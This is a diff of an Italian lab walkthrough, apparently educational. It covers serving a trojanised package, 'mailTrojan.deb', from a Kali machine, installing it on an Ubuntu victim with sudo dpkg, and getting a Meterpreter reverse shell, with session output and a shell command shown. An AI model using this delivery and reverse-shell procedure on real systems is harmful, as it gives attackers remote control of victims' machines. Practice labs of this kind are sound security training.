@@ -85,8 +85,9 @@ msf6 exploit(multi/handler) > exploit
   - scarica i file "mailTrojan.deb" generato nella macchina kali e lo inserisci in una cartella
 3.1 - un modo comodo per scaricare il file nella stessa sottorete è aprire un altro terminale e utilizzare il comando nella cartella interessata 'sudo python3 -m http.server 80' 
 3.2 - accedere dalla macchina Ubuntu dal browser e ricerca http://<IP MACCHINA KALI>/
-8 - accedi alla cartella dove è presente il file e lancia il comando "sudo dpkg -i mailTrojan.deb"
-9 - Ora dal terminale di KAli uscirà questo 
+<CONSIGLIATO> apri SYNAPTIC (sudo SYNAPTIC) e elimina alpine
+4 - accedi alla cartella dove è presente il file e lancia il comando "sudo dpkg -i mailTrojan.deb"
+5 - Ora dal terminale di KAli uscirà questo 
 
 [*] Sending stage (1017704 bytes) to <IP MACCHINA UBUNTU>
 [*] Meterpreter session 1 opened (<IP MACCHINA KALI>:443 -> <IP MACCHINA UBUNTU>:40924) at 2025-10-31 16:02:41 +0000
@@ -99,7 +100,7 @@ Mode              Size  Type  Last modified              Name
 ----              ----  ----  -------------              ----
 100775/rwxrwxr-x  207   fil   2025-10-31 13:45:09 +0000  malicious
 
-9.1 - se vuoi usare il terminale utilizza il comando shell 
+6.1 - se vuoi usare il terminale utilizza il comando shell 
 meterpreter > shell 
 Process 16545 created.
 Channel 3 created.
